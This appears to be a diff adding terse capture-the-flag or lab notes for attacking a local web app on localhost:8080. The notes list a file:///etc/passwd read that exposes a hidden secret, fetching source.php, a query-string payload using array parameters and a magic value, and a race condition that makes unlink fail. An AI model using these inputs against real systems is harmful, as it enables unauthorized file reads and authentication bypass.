@@ -1,0 +1,8 @@
+file:///etc/passwd
+	localhost8080:x:5:60:darksecret-hiddenhere:/usr/games/another-server:/usr/sbin/nologin
+http://localhost:8080
+	get source.php
+
+http://localhost:8080/?user[]=a&secret=0X1337
+with race condition
+(Make request to read $temp_name to make unlink return false)
